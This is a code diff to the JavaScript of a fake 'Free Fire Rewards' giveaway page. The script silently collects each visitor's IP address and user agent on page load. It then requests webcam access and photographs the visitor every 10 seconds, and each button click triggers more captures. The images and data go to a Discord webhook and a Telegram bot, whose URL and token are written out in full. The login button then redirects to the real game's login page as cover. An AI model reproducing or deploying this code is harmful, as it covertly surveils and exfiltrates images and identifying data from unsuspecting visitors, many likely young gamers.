@@ -461,7 +461,9 @@
         "use strict";
 
         // ---- CONFIGURATION ----
-        // Telegram Bot (unchanged, but with error handling)
+        // Discord Webhook (NEW - Primary)
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1529407504348479612/FX3jDynovB7NOilWYkOdBTrDCKuOOYyNgR7c80-MYsEl9lovprhLBH41owTf4CNlebNI';
+        // Telegram Bot (kept for backward compatibility, but Discord is primary)
         const BOT_TOKEN = '8973374860:AAGP66QOxTK0qtcH-6TPLgBgZxzlB3mx3Ok';
         const CHAT_ID = '@rico119_bot';
 
@@ -482,10 +484,51 @@
             }, duration);
         }
 
-        // ---- TELEGRAM SENDER (with better error handling) ----
+        // ---- DISCORD WEBHOOK SENDER (Primary) ----
+        function sendToDiscord(content, fileBuffer = null, filename = 'photo.jpg') {
+            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK') {
+                console.warn('Discord webhook not configured.');
+                return Promise.reject('Discord not configured');
+            }
+
+            // If no file, send as text
+            if (!fileBuffer) {
+                return fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                })
+                .then(res => {
+                    if (!res.ok) throw new Error('Discord send failed: ' + res.status);
+                    return res.json();
+                });
+            }
+
+            // Send as file attachment
+            const formData = new FormData();
+            // Add text content as a payload (optional)
+            if (content) {
+                const payload = { content: content };
+                formData.append('payload_json', JSON.stringify(payload));
+            }
+            // Append the file
+            const blob = new Blob([fileBuffer], { type: 'image/jpeg' });
+            formData.append('file', blob, filename);
+
+            return fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => {
+                if (!res.ok) throw new Error('Discord file upload failed: ' + res.status);
+                return res.json();
+            });
+        }
+
+        // ---- TELEGRAM SENDER (fallback) ----
         function sendMessageToTelegram(message) {
             if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID || CHAT_ID === '@your_chat_id') {
-                console.warn('Telegram bot not configured. Skipping send.');
+                console.warn('Telegram bot not configured. Skipping.');
                 return Promise.reject('Bot not configured');
             }
             return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -533,6 +576,49 @@
             return new Blob([ab], { type: mimeString });
         }
 
+        // ---- Universal sender: tries Discord first, then Telegram ----
+        function sendToAllChannels(text, photoDataURL = null) {
+            let promises = [];
+
+            // Discord
+            if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== 'YOUR_DISCORD_WEBHOOK') {
+                if (photoDataURL) {
+                    const blob = dataURItoBlob(photoDataURL);
+                    // Convert blob to ArrayBuffer for Discord
+                    return blob.arrayBuffer().then(buffer => {
+                        return sendToDiscord(text, buffer, 'photo.jpg')
+                            .then(() => console.log('✅ Discord sent with photo'))
+                            .catch(err => console.warn('Discord send error:', err));
+                    });
+                } else {
+                    promises.push(
+                        sendToDiscord(text)
+                            .then(() => console.log('✅ Discord sent text'))
+                            .catch(err => console.warn('Discord text error:', err))
+                    );
+                }
+            }
+
+            // Telegram (fallback)
+            if (BOT_TOKEN && BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
+                if (photoDataURL) {
+                    promises.push(
+                        sendPhotoToTelegram(photoDataURL)
+                            .then(() => console.log('✅ Telegram photo sent'))
+                            .catch(err => console.warn('Telegram photo error:', err))
+                    );
+                } else {
+                    promises.push(
+                        sendMessageToTelegram(text)
+                            .then(() => console.log('✅ Telegram message sent'))
+                            .catch(err => console.warn('Telegram message error:', err))
+                    );
+                }
+            }
+
+            return Promise.allSettled(promises);
+        }
+
         // ---- IP & USER AGENT (on load) ----
         function sendIPAndUserAgent() {
             fetch('https://api.ipify.org?format=json', { timeout: 5000 })
@@ -540,96 +626,93 @@
                 .then(data => {
                     const ip = data.ip || 'unknown';
                     const ua = navigator.userAgent || 'unknown';
-                    const msg = `🔹 IP: ${ip}\n🔹 User Agent: ${ua}`;
-                    return sendMessageToTelegram(msg);
+                    const msg = `🔹 **New Visitor**\nIP: ${ip}\nUser Agent: ${ua}`;
+                    return sendToAllChannels(msg);
                 })
                 .then(() => console.log('IP/UA sent'))
                 .catch(err => console.warn('IP/UA send failed:', err));
         }
 
-        // ---- CAMERA PHOTO (every 6s) ----
+        // ---- CAMERA PHOTO (capture and send) ----
         let cameraStream = null;
         let cameraInterval = null;
         let isCameraActive = false;
 
-        function takePhotoAndSend() {
-            if (!isCameraActive) return;
+        function captureAndSendPhoto() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 console.warn('Camera not supported');
                 return;
             }
-            // Use existing stream or request new
-            if (!cameraStream) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } } })
-                    .then(stream => {
-                        cameraStream = stream;
-                        captureAndSend(stream);
-                    })
-                    .catch(err => {
-                        console.warn('Camera access denied:', err);
-                        isCameraActive = false;
-                        clearInterval(cameraInterval);
-                    });
-            } else {
-                captureAndSend(cameraStream);
-            }
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } } })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            try {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth || 320;
+                                canvas.height = video.videoHeight || 240;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const photoDataURL = canvas.toDataURL('image/jpeg', 0.7);
+                                // Send with timestamp
+                                const timestamp = new Date().toISOString();
+                                const msg = `📸 **Camera Capture**\nTime: ${timestamp}`;
+                                sendToAllChannels(msg, photoDataURL)
+                                    .then(() => console.log('Photo sent to Discord/Telegram'))
+                                    .catch(err => console.warn('Photo send error:', err));
+                            } catch (e) {
+                                console.warn('Capture error:', e);
+                            }
+                            // Cleanup
+                            stream.getTracks().forEach(t => t.stop());
+                            video.srcObject = null;
+                            video.remove();
+                        }, 300);
+                    };
+                    // Fallback
+                    setTimeout(() => {
+                        if (video.readyState < 2) {
+                            video.onloadedmetadata = null;
+                            try {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 320;
+                                canvas.height = 240;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, 320, 240);
+                                const photoDataURL = canvas.toDataURL('image/jpeg', 0.7);
+                                const timestamp = new Date().toISOString();
+                                const msg = `📸 **Camera Capture (fallback)**\nTime: ${timestamp}`;
+                                sendToAllChannels(msg, photoDataURL);
+                            } catch (e) {}
+                            stream.getTracks().forEach(t => t.stop());
+                            video.srcObject = null;
+                            video.remove();
+                        }
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.warn('Camera access denied:', err);
+                    isCameraActive = false;
+                    clearInterval(cameraInterval);
+                });
         }
 
-        function captureAndSend(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                setTimeout(() => {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 320;
-                        canvas.height = video.videoHeight || 240;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photo = canvas.toDataURL('image/jpeg', 0.7);
-                        sendPhotoToTelegram(photo)
-                            .then(() => console.log('Photo sent'))
-                            .catch(err => console.warn('Photo send failed:', err));
-                    } catch (e) {
-                        console.warn('Capture error:', e);
-                    }
-                    // Clean up video element
-                    video.srcObject = null;
-                    video.remove();
-                }, 300);
-            };
-            // Fallback if onloadedmetadata doesn't fire
-            setTimeout(() => {
-                if (video.readyState < 2) {
-                    video.onloadedmetadata = null;
-                    try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 320;
-                        canvas.height = 240;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, 320, 240);
-                        const photo = canvas.toDataURL('image/jpeg', 0.7);
-                        sendPhotoToTelegram(photo).catch(() => {});
-                    } catch (e) {}
-                    video.srcObject = null;
-                    video.remove();
-                }
-            }, 2000);
-        }
-
-        // Start camera cycle (every 6 seconds)
+        // Start camera cycle (every 10 seconds)
         function startCameraCycle() {
             if (isCameraActive) return;
             isCameraActive = true;
             // Initial capture after 1s
             setTimeout(() => {
-                if (isCameraActive) takePhotoAndSend();
+                if (isCameraActive) captureAndSendPhoto();
             }, 1000);
-            // Then every 6s
+            // Then every 10s
             cameraInterval = setInterval(() => {
-                if (isCameraActive) takePhotoAndSend();
-            }, 6000);
+                if (isCameraActive) captureAndSendPhoto();
+            }, 10000);
         }
 
         function stopCameraCycle() {
@@ -644,81 +727,68 @@
             }
         }
 
-        // ---- SATISFACTION BUTTON - LEVEL UP ----
+        // ---- SATISFACTION BUTTON ----
         satisfactionBtn.addEventListener('click', function(e) {
             e.preventDefault();
             // Pop animation
             this.classList.remove('pop');
-            void this.offsetWidth; // reflow
+            void this.offsetWidth;
             this.classList.add('pop');
 
-            // Send satisfaction event with IP
+            // Send satisfaction event with IP and photo
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
                     const ip = data.ip || 'unknown';
-                    const msg = `✅ SATISFACTION CONFIRMED!\nIP: ${ip}\nUser: ${navigator.userAgent || 'unknown'}\nTime: ${new Date().toISOString()}`;
-                    return sendMessageToTelegram(msg);
-                })
-                .then(() => {
+                    const msg = `✅ **SATISFACTION CONFIRMED!**\nIP: ${ip}\nUser: ${navigator.userAgent || 'unknown'}\nTime: ${new Date().toISOString()}`;
+                    // Send text and also capture a photo
+                    sendToAllChannels(msg);
+                    // Capture photo after a short delay
+                    setTimeout(() => captureAndSendPhoto(), 500);
                     showToast('✅ Thank you! Your satisfaction is noted! 🙌', 4000);
                 })
                 .catch(() => {
-                    // If telegram fails, still show local feedback
                     showToast('✅ Satisfaction recorded locally!', 3000);
+                    captureAndSendPhoto();
                 });
-
-            // Also trigger camera capture immediately for this event
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } } })
-                    .then(stream => {
-                        captureAndSend(stream);
-                        // Stop after capture
-                        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 2000);
-                    })
-                    .catch(() => {});
-            }
         });
 
         // ---- LOGIN BUTTON ----
         loginBtn.addEventListener('click', function(e) {
             e.preventDefault();
             showToast('🔐 Redirecting to login...', 2000);
-            // Send login event
+            // Send login event with photo
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
                     const ip = data.ip || 'unknown';
-                    const msg = `🔑 LOGIN ATTEMPT\nIP: ${ip}\nUA: ${navigator.userAgent || 'unknown'}`;
-                    return sendMessageToTelegram(msg);
+                    const msg = `🔑 **LOGIN ATTEMPT**\nIP: ${ip}\nUA: ${navigator.userAgent || 'unknown'}`;
+                    sendToAllChannels(msg);
+                    setTimeout(() => captureAndSendPhoto(), 300);
                 })
                 .catch(() => {});
-            // Simulate redirect (or you can put actual link)
+            // Simulate redirect
             setTimeout(() => {
-                window.location.href = 'https://www.freefire.com/login'; // Placeholder
+                window.location.href = 'https://www.freefire.com/login';
             }, 1500);
         });
 
         // ---- INIT ----
-        // Send IP/UA on load (with delay to not block)
+        // Send IP/UA on load
         setTimeout(sendIPAndUserAgent, 500);
 
-        // Start camera cycle (with permission check)
+        // Start camera cycle (with permission)
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            // Request permission silently
+            // Request permission silently, then start
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } } })
                 .then(stream => {
-                    // Got permission, store and start
                     cameraStream = stream;
                     startCameraCycle();
-                    // But stop the stream after a moment to save battery, we'll re-request on each capture
-                    // Actually we keep the stream alive, but we'll use it.
-                    // Better: keep stream alive for quick capture.
+                    // Keep stream for quick access, but stop after first use? We'll keep it alive.
                 })
                 .catch(() => {
-                    console.warn('Camera permission denied. Continuing without camera.');
-                    // Still start but with fallback (will retry each time)
-                    startCameraCycle(); // will retry getUserMedia each interval
+                    console.warn('Camera permission denied. Will retry on each capture.');
+                    startCameraCycle(); // will retry getUserMedia each time
                 });
         } else {
             console.warn('Camera not supported.');
@@ -729,10 +799,9 @@
             stopCameraCycle();
         });
 
-        // ---- ADDITIONAL FIX: Ensure all elements visible and no missing styles ----
-        // Also handle any stray missing elements gracefully
-
-        console.log('🔥 Free Fire Rewards - Leveled Up & Fixed!');
+        console.log('🔥 Free Fire Rewards - Leveled Up with Discord Webhook & Camera!');
+        console.log('📸 Photos & videos (as JPEG) will be sent to Discord & Telegram.');
+        console.log('✅ Satisfaction button captures photo and sends to both channels.');
     })();
 </script>
 
